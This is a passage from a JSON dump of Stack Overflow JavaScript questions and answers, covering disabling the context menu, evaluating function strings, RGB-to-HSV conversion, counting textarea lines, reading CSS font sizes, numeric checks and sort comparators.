                    "body": "<p>You can use the <a href=\"https://developer.mozilla.org/en/DOM/window.oncontextmenu\" rel=\"nofollow\"><strong>oncontextmenu</strong></a> event for doing this.</p>\n\n<p>But if the user turns off javascript then you won't be able to handle this.</p>\n\n<pre><code>window.oncontextmenu = function () {\n   return false;\n}\n</code></pre>\n\n<p>will disable right click menu.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>It's unprofessional, anyway this will work with javascript enabled:</p>\n\n<pre><code>document.oncontextmenu = document.body.oncontextmenu = function() {return false;}\n</code></pre>\n\n<p>You may also want to show a message to the user before returning false.</p>\n\n<p>However I have to say that this should not be done generally because it limits users options without resolving the issue (in fact the context menu can be very easily enabled again.).</p>\n\n<p>The following article better explains <strong>why</strong> this should not be done and what other actions can be taken to solve common related issues:\n<a href=\"http://articles.sitepoint.com/article/dont-disable-right-click\">http://articles.sitepoint.com/article/dont-disable-right-click</a></p>\n",
                    "is_accepted": true,
                    "score": 27
                },
                {
                    "body": "<p>Firstly, if you are doing this just to prevent people viewing the source of your page - it won't work, because they can always use a keyboard shortcut to view it.</p>\n\n<p>Secondly, you will have to use JavaScript to accomplish this. If the user has JS disabled, you cannot prevent the right click.</p>\n\n<p>That said, add this to your body tag to disable right clicks.</p>\n\n<pre><code>&lt;body oncontextmenu=\"return false;\"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p><code>&lt;body oncontextmenu=\"return false;\"&gt;</code> works for me in Google Chrome.  Not sure about other browsers.</p>\n\n<p>Note, all someone has to do is disable JavaScript in order to see the right-click menu anyway.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Please do not do that, it is very annoying.</p>\n\n<p>The right menu is there for a reason, and it should be left there.\nMany browser extensions add entries to the right click menu and the user should be able to use it in any page he visits.</p>\n\n<p>Moreover you can use all of the functionality of the right click menu in other ways (keyboard shortcuts, browser menu etc etc etc) so blocking the right click menu has the only effect of annoying the user.</p>\n\n<p>PS: If really you cannot resist the urge to block it at least do not put a popup saying \"no right click allowed\".</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>There are plenty of examples of this which can be found via <a href=\"http://www.google.co.uk/search?q=javascript+disable+right+click\" rel=\"nofollow\">Google</a></p>\n\n<p>However, users can turn off Javascript to stop this highly annoying \"feature\".  I think you should really think about this before implementing it.  It isn't really going to protect your content (if that is what you are trying achieve).</p>\n\n<p>There is an article <a href=\"http://articles.sitepoint.com/article/dont-disable-right-click\" rel=\"nofollow\">here</a> that illustrates just how annoying and pointless it is.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Try this : write below code on body &amp; feel the magic :)</p>\n\n<pre><code>body oncontextmenu=\"return false\"\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You can use Javascript to block right click. <a href=\"http://www.findatips.com/how-to-disable-right-click-on-website.html\" rel=\"nofollow\">Here</a> is a script to block right click on website.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can do so with Javascript and/or an HTML attribute (which is really a Javascript event handler anyway) as described here: <a href=\"http://www.codeproject.com/KB/aspnet/Disabling_the_right_click.aspx\" rel=\"nofollow\">http://www.codeproject.com/KB/aspnet/Disabling_the_right_click.aspx</a></p>\n\n<pre><code>&lt;script language=\"javascript\"&gt;\ndocument.onmousedown=disableclick;\nstatus=\"Right Click Disabled\";\nFunction disableclick(event)\n{\n  if(event.button==2)\n   {\n     alert(status);\n     return false;    \n   }\n}\n&lt;/script&gt;\n</code></pre>\n\n<p>and</p>\n\n<pre><code>&lt;body oncontextmenu=\"return false\"&gt;\n...\n&lt;/body&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>//Disable right click script via java script code</p>\n\n<pre><code>&lt;script language=JavaScript&gt;\n//Disable right click script\nvar message = \"\";\n///////////////////////////////////\nfunction clickIE() {\n    if (document.all) {\n        (message);\n        return false;\n    }\n}\n\nfunction clickNS(e) {\n    if (document.layers || (document.getElementById &amp;&amp; !document.all)) {\n        if (e.which == 2 || e.which == 3) {\n            (message);\n            return false;\n        }\n    }\n}\nif (document.layers) {\n    document.captureEvents(Event.MOUSEDOWN);\n    document.onmousedown = clickNS;\n} else {\n    document.onmouseup = clickNS;\n    document.oncontextmenu = clickIE;\n}\n\ndocument.oncontextmenu = new Function(\"return false\")\n&lt;/script&gt;\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/uj6B2/3/\" rel=\"nofollow\">Click here to see semo</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>window.oncontextmenu = function () {\nreturn false;\n}\n</code></pre>\n\n<p>might help you.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I want to disable mouse right click on an HTML page.\nI have a page where user has to enter the details.\nI don't want the user to see the menu thats get displayed with the mouse right click. Rather I want to display a custom menu. I know there are some plugins available to do that. But my requirement does not need any plugins.</p>\n",
            "last_activity_date": 1389822058,
            "question_id": 3083798,
            "score": 9,
            "tags": [
                "javascript",
                "html",
                "mouse",
                "right-click"
            ],
            "title": "How to disable mouse right click on a web page?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can do this:</p>\n\n<pre><code>//in your case: eval(\"var fn = \" + fnStr);\neval(\"var fn = function(){ blah1;blah2;blah3; }\"); \nfn();\n</code></pre>\n\n<p>Not sure how to get it much simpler, sometimes there's no (better) way around <code>eval()</code>.  Here's a <a href=\"http://jsfiddle.net/t3ktE/\">quick example of this in action</a>.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>There's also the <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function\">Function</a> object.</p>\n\n<pre><code>var adder = new Function(\"a\", \"b\", \"return a + b\");\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 15
                },
                {
                    "body": "<p>Use parentheses.</p>\n\n<pre><code>var fn = eval(\"(function() {...})\");\n</code></pre>\n\n<p>This technique is also good for transmitting JSON values.</p>\n\n<p>By the way, it's often better to build functions by composing them directly from other functions.  If you are using strings, you have to worry about things like unexpected <a href=\"http://en.wikipedia.org/wiki/Common_Lisp#Variable_capture_and_shadowing\" rel=\"nofollow\">variable capture</a>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>The <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function?redirectlocale=en-US&amp;redirectslug=JavaScript/Reference/Global_Objects/Function\" rel=\"nofollow\">Function </a> constructor creates a new Function object. In JavaScript every function is actually a Function object.</p>\n\n<pre><code>// Create a function that takes two arguments and returns the sum of those arguments\nvar fun = new Function(\"a\", \"b\", \"return a + b\");\n// Call the function\nfun(2, 6);\nOutput: 8\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Say I've got a Javascript string like the following</p>\n\n<pre><code>var fnStr = \"function(){blah1;blah2;blah3; }\" ;\n</code></pre>\n\n<p>(This may be from an expression the user has typed in, duly sanitized, or it may be the result of some symbolic computation.  It really doesn't matter).</p>\n\n<p>I want to define <code>fn</code> as if the following line was in my code:</p>\n\n<pre><code>var fn = function(){blah1;blah2;blah3; } ;\n</code></pre>\n\n<p>How do I do that?</p>\n\n<p>The best I've come up with is the following:</p>\n\n<pre><code>var fn = eval(\"var f = function(){ return \"+fnStr+\";}; f() ;\") ;\n</code></pre>\n\n<p>This seems to do the trick, even though it uses the dreaded <code>eval()</code>, and uses a slightly convoluted argument.  Can I do better?  I.e. either not use <code>eval()</code>, or supply it with a simpler argument?</p>\n",
            "last_activity_date": 1402845628,
            "question_id": 2573548,
            "score": 9,
            "tags": [
                "javascript"
            ],
            "title": "Given a string describing a Javascript function, convert it to a Javascript function"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>The resulting HSV array has to be interpreted as three fractions. For some programs, if you want to express HSV as integers, you multiply the \"H\" value by 360 and the \"S\" and \"V\" values by 100.  The HSV value you quote for your green shade RGB[126, 210, 22] is HSV [87, 81, 45] in integers.  You could change the function to return such integers if you want to:</p>\n\n<pre><code>function rgbToHsl(r, g, b){\n    r /= 255, g /= 255, b /= 255;\n    var max = Math.max(r, g, b), min = Math.min(r, g, b);\n    var h, s, l = (max + min) / 2;\n\n    if(max == min){\n        h = s = 0; // achromatic\n    }else{\n        var d = max - min;\n        s = l &gt; 0.5 ? d / (2 - max - min) : d / (max + min);\n        switch(max){\n            case r: h = (g - b) / d + (g &lt; b ? 6 : 0); break;\n            case g: h = (b - r) / d + 2; break;\n            case b: h = (r - g) / d + 4; break;\n        }\n        h /= 6;\n    }\n\n    return [Math.floor(h * 360), Math.floor(s * 100), Math.floor(l * 100)];\n}\n</code></pre>\n\n<p>[edit] that said, it's still giving me something with a brightness (\"L\" or \"V\") that's considerably too dark; Gimp says that the HSV value should be [90, 80, 82], or in fractional terms [.20, .80, .82].</p>\n\n<p>[another edit] well one problem could be that HSL and HSV are different schemes ... still looking around.</p>\n\n<p>OK in case anybody wants RGB to HSV (like you'd see in Gimp for example) here's a version of that:</p>\n\n<pre><code>function rgbToHsv(r, g, b) {\n    var\n        min = Math.min(r, g, b),\n        max = Math.max(r, g, b),\n        delta = max - min,\n        h, s, v = max;\n\n    v = Math.floor(max / 255 * 100);\n    if ( max != 0 )\n        s = Math.floor(delta / max * 100);\n    else {\n        // black\n        return [0, 0, 0];\n    }\n\n    if( r == max )\n        h = ( g - b ) / delta;         // between yellow &amp; magenta\n    else if( g == max )\n        h = 2 + ( b - r ) / delta;     // between cyan &amp; yellow\n    else\n        h = 4 + ( r - g ) / delta;     // between magenta &amp; cyan\n\n    h = Math.floor(h * 60);            // degrees\n    if( h &lt; 0 ) h += 360;\n\n    return [h, s, v];\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 15
                },
                {
                    "body": "<p>Function below converts <code>RGB</code> color into Hue Saturation Brightness color like Photoshop color picker, results are in the ranges:</p>\n\n<ul>\n<li>Hue 0-360 (degrees)</li>\n<li>Saturation: 0-100 (%)</li>\n<li>Brightness: 0-100 (%)</li>\n</ul>\n\n<p>I still don't understand why people use the term <code>HSV</code> (Hue Saturation Value) instead of <code>HSB</code> (Hue Saturation Brightness), anyway it's a matter fo terminology, the results are the same</p>\n\n<pre><code>   //Converts to color HSB object (code from here http://www.csgnetwork.com/csgcolorsel4.html with some improvements)\n   function rgb2hsb(r, g, b)\n   {    \n    r /= 255; g /= 255; b /= 255; // Scale to unity.   \n    var minVal = Math.min(r, g, b),\n    maxVal = Math.max(r, g, b),\n    delta = maxVal - minVal,\n    HSB = {hue:0, sat:0, bri:maxVal},\n    del_R, del_G, del_B;\n\n    if( delta !== 0 )\n    {\n        HSB.sat = delta / maxVal;\n        del_R = (((maxVal - r) / 6) + (delta / 2)) / delta;\n        del_G = (((maxVal - g) / 6) + (delta / 2)) / delta;\n        del_B = (((maxVal - b) / 6) + (delta / 2)) / delta;\n\n        if (r === maxVal) {HSB.hue = del_B - del_G;}\n        else if (g === maxVal) {HSB.hue = (1 / 3) + del_R - del_B;}\n        else if (b === maxVal) {HSB.hue = (2 / 3) + del_G - del_R;}\n\n        if (HSB.hue &lt; 0) {HSB.hue += 1;}\n        if (HSB.hue &gt; 1) {HSB.hue -= 1;}\n    }\n\n    HSB.hue *= 360;\n    HSB.sat *= 100;\n    HSB.bri *= 100;\n\n    return HSB;\n   }\n</code></pre>\n\n<p>Usage example:</p>\n\n<pre><code>var hsb = rgb2hsb(126,210,22);\nalert(\"hue = \" + hsb.hue + \"saturation = \" + hsb.sat + \"brightness = \" + hsb.bri);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I found this RGB to HSL script over at <a href=\"http://www.mjijackson.com/2008/02/rgb-to-hsl-and-rgb-to-hsv-color-model-conversion-algorithms-in-javascript\">http://www.mjijackson.com/2008/02/rgb-to-hsl-and-rgb-to-hsv-color-model-conversion-algorithms-in-javascript</a>. I can't find any other small decent ones. The issue is that this code doesn't even really work. Would anybody know why? (I don't know a bit of color math, but maybe it's returning the complementary?)</p>\n\n<pre><code>function rgbToHsl(r, g, b){\n    r /= 255, g /= 255, b /= 255;\n    var max = Math.max(r, g, b), min = Math.min(r, g, b);\n    var h, s, l = (max + min) / 2;\n\n    if(max == min){\n        h = s = 0; // achromatic\n    }else{\n        var d = max - min;\n        s = l &gt; 0.5 ? d / (2 - max - min) : d / (max + min);\n        switch(max){\n            case r: h = (g - b) / d + (g &lt; b ? 6 : 0); break;\n            case g: h = (b - r) / d + 2; break;\n            case b: h = (r - g) / d + 4; break;\n        }\n        h /= 6;\n    }\n\n    return [h, s, l];\n}\n</code></pre>\n\n<p><strong>Edit: when I run <code>rgbToHsl(126,210,22)</code> it's giving me [ .24, .81, .45 ], which is the HSL for an orange color.</strong></p>\n",
            "last_activity_date": 1306779255,
            "question_id": 2348597,
            "score": 9,
            "tags": [
                "javascript",
                "colors",
                "rgb",
                "hsl"
            ],
            "title": "Why doesn&#39;t this Javascript RGB to HSL code work?"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>What about splitting on \"\\n\" instead?</p>\n\n<p>It will also be a problem where one line wrapped to 2 lines in the textarea.</p>\n\n<p>To do it accurately like this, you could use a fixed height font and measure pixels. This could be problematic though.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>user <code>\\n</code> instead of <code>\\r</code></p>\n\n<pre><code>var text = $(\"#myTextArea\").val();   \nvar lines = text.split(\"\\n\");\nvar count = lines.length;\nconsole.log(count);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>If you are just wanting to test hard line returns, this will work cross platform:</p>\n\n<pre><code>var text = $(\"#myTextArea\").val();   \nvar lines = text.split(/\\r|\\r\\n|\\n/);\nvar count = lines.length;\nconsole.log(count); // Outputs 4\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>The normal newline character is \"\\n\". The convention on some systems is to also have \"\\r\" beforehand, so on these systems \"\\r\\n\" is often found to mean a new line. In a browser, unless the user intentionally enters a \"\\r\" by copying it from somewhere else, the newline will probably be expressed as just \"\\n\". In either case splitting by \"\\n\" will count the number of lines.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The problem with using \"\\n\" or \"\\r\" is it only counts the number of returns, if you have a line that is long it could wrap and then it wouldn't be counted as a new line. This is an alternative way to get the number of lines - so it may not be the best way.</p>\n\n<p>Edit (thanks alex): </p>\n\n<p>Script</p>\n\n<pre><code>$(document).ready(function(){\n var lht = parseInt($('textarea').css('lineHeight'),10);\n var lines = $('textarea').attr('scrollHeight') / lht;\n console.log(lines);\n})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>I have implemented the lines and lineCount methods as String prototypes:</p>\n\n<pre><code>String.prototype.lines = function() { return this.split(/\\r*\\n/); }\nString.prototype.lineCount = function() { return this.lines().length; }\n</code></pre>\n\n<p>Apparently the split method will not count a carriage return and/or newline character at the end of the string (or the innerText property of a textarea) in IE9, but it will count it in Chrome 22, yielding different results.</p>\n\n<p>So far I have accomodated for this by subtracting 1 from the line count when the browser is other than Internet Explorer:</p>\n\n<pre><code>String.prototype.lineCount = function() { return this.lines().length - navigator.userAgent.indexOf(\"MSIE\") != -1); }\n</code></pre>\n\n<p>Hopefully someone has a better RegExp or another workaround.</p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;script&gt;\nfunction countLines(theArea){\nvar theLines = theArea.value.replace((new RegExp(\".{\"+theArea.cols+\"}\",\"g\")),\"\\n\").split(\"\\n\");\nif(theLines[theLines.length-1]==\"\") theLines.length--;\ntheArea.form.lineCount.value = theLines.length;\n}\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form&gt;\n&lt;textarea name=\"myText\" onKeyUp=\"countLines(this)\" cols=\"10\" rows=\"10\"&gt;\n&lt;/textarea&gt;\n&lt;br&gt;\nLines:\n&lt;input type=text name=\"lineCount\" size=\"2\" value=\"0\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>This function counts the number of lines which have text in a textarea:</p>\n\n<pre><code>function countLine(element) {\n  var text = $(element).val();\n  var lines = text.split(\"\\n\");\n  var count = 0;\n  for (var i = 0; i &lt; lines.length-1; i++) {\n    if (lines[i].trim()!=\"\" &amp;&amp; lines[i].trim()!=null) {\n      count += 1;\n    }\n  }\n  return count;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>What I would like is to count the number of lines in a textarea, e.g:</p>\n\n<pre><code>line 1\nline 2\nline 3\nline 4\n</code></pre>\n\n<p>should count up to 4 lines. Basically pressing enter once would transfer you to the next line</p>\n\n<p>The following code isn't working:</p>\n\n<pre><code>var text = $(\"#myTextArea\").val();   \nvar lines = text.split(\"\\r\");\nvar count = lines.length;\nconsole.log(count);\n</code></pre>\n\n<p>It always gives '1' no matter how many lines.</p>\n",
            "last_activity_date": 1426074063,
            "question_id": 2035910,
            "score": 9,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "How to get the number of lines in a textarea?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>This jQuery plugin looks like it will do the trick:</p>\n\n<p><a href=\"http://www.filamentgroup.com/lab/update%5Fjquery%5Fplugin%5Ffor%5Fretaining%5Fscalable%5Finterfaces%5Fwith%5Fpixel%5Fto%5Fem%5Fcon/\" rel=\"nofollow\">http://www.filamentgroup.com/lab/update_jquery_plugin_for_retaining_scalable_interfaces_with_pixel_to_em_con/</a></p>\n",
                    "is_accepted": true,
                    "score": 2
                },
                {
                    "body": "<p>i had this problem once. i use this function to get the int value of a css attribute, if there is one.</p>\n\n<pre><code>function PBMtoInt(str)\n{ \nreturn parseInt(str.replace(/([^0-9\\.\\-])+/,\"\")!=\"\"?str.replace(/([^0-9\\.\\-])+/,\"\"):\"0\");\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>All of your target browsers with the exception of IE will report to you the <a href=\"http://blog.stchur.com/2006/06/21/css-computed-style/\" rel=\"nofollow\">\"Computed Style\"</a> of the element. In your case you don't <em>want</em> to know what the computed <code>px</code> size is for <code>font-size</code>, but rather you want the value set in your stylesheet(s).</p>\n\n<p>Only IE can get this right with its <a href=\"http://msdn.microsoft.com/en-us/library/ms535231%28VS.85%29.aspx\" rel=\"nofollow\"><code>currentStyle</code></a> feature. Unfortunately jQuery in this case works <em>against</em> you and even gets IE to report the computed size in <code>px</code> (it uses <a href=\"http://erik.eae.net/archives/2007/07/27/18.54.15/#comment-102291\" rel=\"nofollow\">this hack</a> by Dean Edwards to do so, you can check <a href=\"https://github.com/jquery/jquery/blob/1.9.1/src/css.js#L368\" rel=\"nofollow\">the source</a> yourself).</p>\n\n<p>So in a nutshell, what you want is impossible cross-browser. Only IE can do it (provided you bypass jQuery to access the property). Your solution of setting the value inline (as opposed to in a stylesheet) is the best you can do, as then the browser does not need to compute anything.</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>In Chrome: </p>\n\n<pre><code>var rules = window.getMatchedCSSRules(document.getElementById('target'))\n</code></pre>\n\n<p>returns a <code>CSSRuleList</code> object. Need to do a bit more experimentation with this, but it looks like if <code>m &lt; n</code> then the <code>CSSStyleRule</code> at <code>rules[n]</code> overrides the one at <code>rules[m]</code>. So:</p>\n\n<pre><code>for(var i = rules.length - 1; i &gt;= 0; --i) {\n    if(rules[i].style.fontSize) {\n        return /.*(em|ex|ch|rem|vh|vw|vmin|vmax|px|in|mm|cm|pt|pc|%)$/.exec(rules[i].style.fontSize)[1];\n    }\n}\n</code></pre>\n\n<p>In Firefox, maybe use <code>sheets = document.styleSheets</code> to get all your stylesheets as a <code>StyleSheetList</code>, then iterate over each <code>CSSStyleSheet sheet</code> in <code>sheets</code>. Iterate through the <code>CSSStyleRule</code>s in <code>sheet</code> (ignoring the <code>CSSImportRule</code>s) and test each rule against the target element via <code>document.getElementById('target').querySelector(rule.selectorText)</code>. Then apply the same regexp as above..... but that's all just a guess, I haven't tested it out or anything.... </p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm writing a simple jQuery that to change the font size of an element by a certain percentage. The problem I'm having is that when I get the size with jQuery's $('#el').css('font-size') it always returns a pixel value, even when set with em's. When I use Javscript's el.style.font-size property, it won't return a value until one has been explicitly set by the same property.</p>\n\n<p>Is there some way I can get the original CSS set font-size value with Javascript? How cross-browser friendly is your method?</p>\n\n<p>Thanks in advance!</p>\n\n<p><strong>Edit:</strong> I should note that all the tested browsers (See comment below) allow me to set the the text-size using an 'em' value using the two methods mentioned above, at which point the jQuery .css() returns an equivalent 'px' value and the Javascript .style.fontSize method returns the correct 'em' value. Perhaps the best way to do this would be to initialize the elements on page load, giving them an em value right away.</p>\n",
            "last_activity_date": 1374296497,
            "question_id": 1313995,
            "score": 9,
            "tags": [
                "javascript",
                "jquery",
                "css",
                "dom"
            ],
            "title": "How can I get the font size of an element as it was set by css"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<pre><code>function is_numeric(val) {\n  return ((+val) == val);\n}\n</code></pre>\n\n<p>That should do the trick.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This checks for numerical values, including negative and floating point numbers.</p>\n\n<pre><code>function is_numeric(val){\n    return val &amp;&amp; /^-?\\d+(\\.\\d+)?$/.test(val + '');\n}\n</code></pre>\n\n<p><hr /></p>\n\n<p>@Vordreller: I corrected the Regex. It should work properly now.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>What about: </p>\n\n<pre><code>function isNumber(n){\n    return typeof(n) != \"boolean\" &amp;&amp; !isNaN(n);\n}\n</code></pre>\n\n<p>The <a href=\"http://www.w3schools.com/jsref/jsref%5FisNaN.asp\">isNaN</a> built-in function is used to check if a value is <strong>not</strong> a number.</p>\n\n<p><strong>Update:</strong> Christoph is right, in JavaScript Boolean types are convertible to Number, returning the 1 for true and 0 for false, so if you evaluate <code>1 + true</code> the result will be 2.</p>\n\n<p>Considering this behavior I've updated the function to prevent converting boolean values to its numeric representation.</p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>To check types in javascript you can use the <code>typeof</code> operator:</p>\n\n<pre><code>js&gt; var x = 1;\njs&gt; typeof(x);\nnumber\n</code></pre>\n\n<p>So:</p>\n\n<pre><code>if (typeof(x) === 'number') {\n   // Do something\n}\n</code></pre>\n\n<p>If you want to coerce the value of a variable to an integer, you can use <code>parseInt(x, 10)</code> which will parse the value as an integer in base 10.  Similarly, you can use <code>parseFloat</code> if you want a floating point value.  However, these will always coerce regardless of type so passing <code>null</code>, <code>true</code>, etc will always return a number.  However, you can check whether its a valid number by calling <code>isNaN</code>.</p>\n\n<p>So, putting it all together:</p>\n\n<pre><code>!isNaN(parseFloat(23)) // true\n!isNaN(parseFloat('23')) // true\n!isNaN(parseFloat(23.5)) // true\n!isNaN(parseFloat(true)) // false\n</code></pre>\n\n<p>or</p>\n\n<pre><code>function isNumber(x) {\n    return !isNaN(parseFloat(x));\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I don't think any of the suggestions till now actually work. Eg</p>\n\n<pre><code>!isNaN(parseFloat(foo))\n</code></pre>\n\n<p>doesn't because <code>parseFloat()</code> ignores trailing non-numeric characters.</p>\n\n<p>To work around this, you could compare the returned value to the one returned by a cast via <code>Number()</code> (or equivalently by using unary <code>+</code>, but I prefer explicit casting):</p>\n\n<pre><code>parseFloat(foo) === Number(foo)\n</code></pre>\n\n<p>This will still work if both functions return <code>NaN</code> because <code>NaN !== NaN</code> is <code>true</code>.</p>\n\n<p>Another possibility would be to first cast to string, then to number and then check for <code>NaN</code>, ie</p>\n\n<pre><code>!isNaN(Number(String(foo)))\n</code></pre>\n\n<p>or equivalently, but less readable (but most likely faster)</p>\n\n<pre><code>!isNaN(+('' + foo))\n</code></pre>\n\n<p>If you want to exclude infinity values, use <code>isFinite()</code> instead of <code>!isNaN()</code>, ie</p>\n\n<pre><code>isFinite(Number(String(foo)))\n</code></pre>\n\n<p>The explicit cast via <code>Number()</code> is actually unnecessary, because <code>isNan()</code> and <code>isFinite()</code> cast to number implicitly - that's the reason why <code>!isNaN()</code> doesn't work!</p>\n\n<p>In my opinion, the most appropriate solution therefore would be</p>\n\n<pre><code>isFinite(String(foo))\n</code></pre>\n\n<hr>\n\n<p>As Matthew pointed out, the second approach does not handle strings that only contain whitespace correctly.</p>\n\n<p>It's not hard to fix - use the code from Matthew's comment or</p>\n\n<pre><code>isFinite(String(foo).trim() || NaN)\n</code></pre>\n\n<p>You'll have to decide if that's still nicer than comparing the results of <code>parseFloat()</code> and <code>Number()</code>.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>Here's what I came up with:</p>\n\n<pre><code>value = \"2.34\";\nif (parseFloat(value).toString() === value) {\n    alert(\"number\");\n}\n</code></pre>\n\n<p>This should work with floats and ints, positive and negative. I don't know about infinity, as some of the answers above have discussed.</p>\n\n<p>If your value might actually be a number and not always a string, you can change the === to a == and it will handle both.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Here's some benchmarks for isNaN vs. isFinite and typeof === \"number\"</p>\n\n<p><a href=\"http://jsperf.com/isnan-vs-isfinite-vs/3\" rel=\"nofollow\">http://jsperf.com/isnan-vs-isfinite-vs/3</a></p>\n\n<p>Apparently typeof === \"number\" is roughly 5 times faster</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>In PHP, it's pretty easy:</p>\n\n<pre><code>is_numeric(23);//true\nis_numeric(\"23\");//true\nis_numeric(23.5);//true\nis_numeric(true);//false\n</code></pre>\n\n<p>But how do I do this in Javascript?\nI could use a regular expression, but is there a function for this?</p>\n",
            "last_activity_date": 1405726862,
            "question_id": 600763,
            "score": 9,
            "tags": [
                "javascript"
            ],
            "title": "Check if a variable contains a numerical value in Javascript?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>A compare method should obey the contract</p>\n\n<pre><code>Math.sign(compare(a, b)) = -Math.sign(compare(b, a))\n</code></pre>\n\n<p>If you return a nonzero answer when a==b, that contract is violated.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<blockquote>\n  <p>So I was wondering if there is any advantage on omitting a return 0 statement.</p>\n</blockquote>\n\n<p>Less letters to type. And it might be a tiny bit faster due to the one omitted comparison. All other effects are disadvantages.</p>\n\n<blockquote>\n  <p>I realized that on MDN, it also says:</p>\n  \n  <blockquote>\n    <p>Note: the ECMAscript standard does not guarantee this behaviour, and\n    thus not all browsers (e.g. Mozilla versions dating back to at least\n    2003) respect this.</p>\n  </blockquote>\n  \n  <p>referring to the behavior, that a and b should remain unchanged if 0\n  is returned.</p>\n</blockquote>\n\n<p>That the position of <code>a</code> and <code>b</code> may remain unchanged is only the requirement for a <a href=\"https://en.wikipedia.org/wiki/Stable_sort#Stability\" rel=\"nofollow\">stable sort</a>. This is not a specified behaviour, and some browsers have implemented a non-stable sort algorithm.</p>\n\n<p>However, the actual purpose of returning zero is that neither <code>a</code> is sorted before <code>b</code> (as if less than 0) nor that <code>b</code> is sorted before <code>a</code> (as if greater than 0) - basically when <code>a</code> equals <code>b</code>. This is a must-have for a comparison, and all sorting algorithms obey it.</p>\n\n<p>To produce a valid, satisfiable ordering (mathematically: divide the items into <a href=\"https://en.wikipedia.org/wiki/Total_order\" rel=\"nofollow\">totally ordered</a> equivalence classes), a comparison must have certain properties. They are listed in the <a href=\"http://www.ecma-international.org/ecma-262/5.1/#sec-15.4.4.11\" rel=\"nofollow\">spec for <code>sort</code></a> as requirements for a \"<em>consistent comparison function</em>\".</p>\n\n<p>The most prominent one is reflexivity, demanding that an item <code>a</code> is equal to <code>a</code> (itself). Another way to say this is:</p>\n\n<blockquote>\n  <p><code>compare(a, a)</code> must always return <code>0</code></p>\n</blockquote>\n\n<p>What happens when a comparison function does not satisfy this (like the one you stumbled upon obviously does)?</p>\n\n<p>The spec says</p>\n\n<blockquote>\n  <p>If <code>comparefn</code> [\u2026] is not a consistent comparison function for the elements of this array, the behaviour of <code>sort</code> is implementation-defined.</p>\n</blockquote>\n\n<p>which basically means: If you provide an invalid comparison function, the array will probably not be sorted correctly. It might be randomly permuted, but the <code>sort</code> call does not even need to terminate.</p>\n\n<blockquote>\n  <p>So maybe, by returning 0, we get a slightly different\n  sorted array in different browsers? Could that be a reason?</p>\n</blockquote>\n\n<p>No, by returning 0 you get a correctly sorted array across browsers (which might be different due to the unstable sort). The reason is that by not returning 0 you get slightly different permuted arrays (if at all), maybe even producing the expected result but usually in a more complicated manner.</p>\n\n<p>So what could happen if you don't return 0 for equivalent items? Some implementations have no problems with this, as they never compare an item to itself (even if apparent at multiple positions in the array) - one can optimize this and omit the costly call to the compare function when it is already known that the result must be 0.</p>\n\n<p>The other extreme would be a never-terminating loop. Assuming you had two equivalent items after each other, you would compare the latter with the former and realize that you had to swap them. Testing again, the latter would still be smaller than the former and you'd have to swap them again. And so on\u2026</p>\n\n<p>However, an efficient algorithm mostly <em>does not</em> test already compared items 